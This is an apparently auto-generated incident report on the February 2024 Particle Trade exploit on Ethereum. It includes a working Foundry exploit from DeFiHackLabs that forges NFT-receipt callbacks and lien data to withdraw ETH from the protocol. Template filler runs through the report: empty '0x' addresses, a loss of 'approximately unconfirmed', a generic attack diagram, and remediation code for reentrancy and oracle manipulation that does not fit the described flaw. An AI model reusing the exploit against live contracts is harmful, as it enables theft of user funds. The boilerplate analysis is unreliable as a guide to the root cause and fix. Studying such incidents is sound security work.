# Particle Trade — Collateral Calculation Error During Leveraged Position Liquidation Analysis

| Item | Details |
|------|------|
| **Date** | 2024-02-29 |
| **Protocol** | Particle Trade |
| **Chain** | Ethereum |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://etherscan.io/address/0x) |
| **Attack Tx** | [0x](https://etherscan.io/tx/0x) |
| **Vulnerable Contract** | [0x](https://etherscan.io/address/0x) |
| **Root Cause** | Collateral calculation error during leveraged position liquidation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/ParticleTrade_exp.sol) |

---
## 1. Vulnerability Overview

Particle Trade is a DeFi protocol operating on the Ethereum chain that suffered a **collateral / liquidation error** attack on 2024-02-29.
The attacker exploited a collateral calculation error during leveraged position liquidation, causing approximately **unconfirmed** in damages.

### Key Vulnerability Summary
- **Classification**: Collateral / Liquidation Error
- **Impact**: Unconfirmed loss of protocol assets
- **Attack Vector**: Logic vulnerability

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: Collateral calculation error during leveraged position liquidation
// The attacker exploits this logic to gain illegitimate profit

// IParticleExchange interface — functions vulnerable to collateral liquidation error
interface IParticleExchange {
    // ❌ Vulnerable: insufficient margin validation after position creation via offerBid
    // Liquidation threshold can be bypassed by manipulating price/rate
    function offerBid(
        address collection,
        uint256 margin,
        uint256 price,
        uint256 rate
    ) external returns (uint256 lienId);

    // ❌ Vulnerable: no lienId owner validation when executing swapWithEth
    // Can drain collateral by executing ETH swap using another user's lienId
    function swapWithEth(Lien calldata lien, uint256 lienId) external;

    // ❌ Vulnerable: withdrawAccountBalance allows balance withdrawal before liquidation
    function withdrawAccountBalance() external;
    function accountBalance(address account) external returns (uint256 balance);
    function onERC721Received(address, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
}

// ✅ Correct implementation: lienId owner validation + collateral ratio check
function safeSwapWithEth(Lien calldata lien, uint256 lienId) external nonReentrant {
    // ✅ Verify lienId is owned by the caller
    require(lienOwner[lienId] == msg.sender, "Swap: not lien owner");
    // ✅ Verify current collateral ratio is at or above liquidation threshold
    uint256 currentRatio = getCollateralRatio(lien);
    require(currentRatio >= MIN_COLLATERAL_RATIO, "Swap: undercollateralized");
    // ✅ Lock position to prevent reentrancy
    require(!lienLocked[lienId], "Swap: lien locked");
    lienLocked[lienId] = true;
    _executeSwap(lien, lienId);
    lienLocked[lienId] = false;
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Identify Vulnerability] ─────── Particle Trade Contract
  │
  ▼
[Send Malicious Transaction] ─── Call Vulnerable Function
  │                                (Bypass Validation)
  ▼
[Drain Assets] ──────────────── Secure Profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - ParticleTrade_exp.sol
// Chain: Ethereum | Date: 2024-02-29

    function testExploit() public {
        payable(zero).transfer(address(this).balance);
        emit log_named_decimal_uint("Attacker Eth balance before attack:", address(this).balance, 18);
        uint256 tokenId = 50_126_827_091_960_426_151;
        uint256 tokenId2 = 19_231_446;
        (uint256 lienId) = proxy.offerBid(address(this), uint256(0), uint256(0), uint256(0));
        IParticleExchange.Lien memory lien = IParticleExchange.Lien({
            lender: zero,
            borrower: address(this),
            collection: address(this),
            tokenId: 0,
            price: 0,
            rate: 0,
            loanStartTime: 0,
            auctionStartTime: 0
        });
        uint256 amount = 0;
        bytes memory bytecode = (abi.encode(lien, lienId, amount, Reservoir, zero, "0x"));
        proxy.onERC721Received(zero, zero, tokenId, bytecode);

        IParticleExchange.Lien memory lien2 = IParticleExchange.Lien({
            lender: zero,
            borrower: address(this),
            collection: address(this),
            tokenId: tokenId,
            price: 0,
            rate: 0,
            loanStartTime: block.timestamp,
            auctionStartTime: 0
        });

        bytes memory bytecode2 = (abi.encode(lien2, lienId, amount, Reservoir, zero, "0x"));
        ownerofaddr = address(proxy);
        proxy.onERC721Received(zero, zero, tokenId2, bytecode2);

        proxy.accountBalance(address(this));
        proxy.withdrawAccountBalance();

        emit log_named_decimal_uint("Attacker Eth balance after attack:", address(this).balance, 18);
    }

    function ownerOf(
        uint256 tokenId
    ) external returns (address owner) {
        return ownerofaddr;
    }

    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata _data) external {
        ownerofaddr = address(0);
        return;
    }

    receive() external payable {}
}

```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Classification Criterion | Details |
|-----------|------|
| **DASP Top 10** | Logic Vulnerability |
| **Attack Type** | Smart Contract Bug |
| **Vulnerability Category** | DeFi Attack |
| **Attack Complexity** | Medium |
| **Prerequisites** | Access to vulnerable function |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable functions**: Apply emergency pause to the affected functions
2. **Assess damage**: Identify the scale of lost assets and classify affected users
3. **Notify relevant parties**: Immediately alert related DEXes, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on the current spot price
}
```

### Long-Term Improvements
- Conduct **independent security audits** (at least 2 separate audit firms)
- Run a **bug bounty program**
- Establish a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency pause mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Collateral / liquidation error attacks are preventable**: Defensible with proper validation and pattern application
2. **Consider economic incentives**: All functions must be designed with the attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets must be the top audit priority

### For Protocol Operators
1. **Real-time monitoring**: Build a system to instantly detect abnormal large-scale transactions
2. **Incident response plan**: Maintain an immediately executable response playbook for attack scenarios
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the DeFi Ecosystem at Large
- The **2024-02-29** Particle Trade incident reconfirms the danger of **collateral / liquidation error** attacks in the Ethereum ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Strengthening community-level security information sharing is strongly recommended

---
*This document was prepared for educational and security research purposes. Do not misuse.*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/ParticleTrade_exp.sol)*